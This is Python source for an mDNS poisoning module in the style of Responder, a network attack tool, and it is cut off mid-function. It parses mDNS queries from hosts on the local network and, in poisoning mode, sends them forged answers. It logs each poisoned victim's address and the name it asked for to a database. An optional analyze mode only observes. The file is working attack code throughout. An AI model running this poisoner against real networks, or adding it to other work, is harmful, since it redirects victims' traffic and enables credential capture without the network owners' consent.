import struct
import sys
from socketserver import BaseRequestHandler
from ipaddress import ip_address
from packets import MDNS_Ans, MDNS6_Ans
from utils import *

def Parse_MDNS_Name(data: bytes) -> str:
    try:
        data = data[12:]
        NameLen = data[0]
        Name = data[1:1+NameLen]
        NameLen_ = data[1+NameLen]
        Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
        FinalName = Name + b'.' + Name_
        return FinalName.decode("latin-1")
    except IndexError:
        return None

def Poisoned_MDNS_Name(data: bytes) -> bytes:
    data = bytearray(data[12:])
    return bytes(data[:len(data)-5])

class MDNS(BaseRequestHandler):
    def handle(self):
        data, soc = self.request
        Request_Name = Parse_MDNS_Name(data)
        MDNSType = ip_address(data[8:24]) == ip_address('ff02::fb')

        # Break out if we don't want to respond to this host
        if not Request_Name or not RespondToThisHost(self.client_address[0], Request_Name):
            return None

        if settings.Config.AnalyzeMode:  # Analyze Mode
            print(f'[Analyze mode: MDNS] Request by {color(self.client_address[0].replace("::ffff:",""), 3)} for {color(Request_Name, 3)}, ignoring')
            SavePoisonersToDb({
                'Poisoner': 'MDNS', 
                'SentToIp': self.client_address[0], 
                'ForName': Request_Name,
                'AnalyzeMode': '1',
            })
        elif MDNSType:  # Poisoning Mode
            Poisoned_Name = Poisoned_MDNS_Name(data)
            Buffer = MDNS_Ans(AnswerName=Poisoned_Name)
            Buffer.calculate()
            soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
            print(f'[*] [MDNS] Poisoned answer sent to {color(self.client_address[0].replace("::ffff:",""), 2, 1)} for name {Request_Name}')
            SavePoisonersToDb({
                'Poisoner': 'MDNS

